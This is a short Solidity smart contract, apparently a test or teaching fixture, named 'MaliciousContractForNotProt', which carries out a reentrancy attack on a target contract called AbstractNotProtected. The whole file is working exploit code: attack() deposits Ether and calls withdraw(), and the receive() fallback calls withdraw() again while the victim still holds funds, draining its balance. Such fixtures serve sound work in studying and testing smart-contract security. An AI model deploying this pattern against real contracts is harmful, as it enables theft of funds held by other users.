// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AbstractNotProtected.sol";

contract MaliciousContractForNotProt {
    AbstractNotProtected public abstractNotProtected;

    constructor(address _abstractNotProtectedAddress) {
        abstractNotProtected = AbstractNotProtected(_abstractNotProtectedAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if (address(abstractNotProtected).balance > 0) {
            abstractNotProtected.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        abstractNotProtected.addBalance{value: msg.value}();
        abstractNotProtected.withdraw();
    }

    function getVictim() public view returns (address) {
        return address(abstractNotProtected);
    }
}
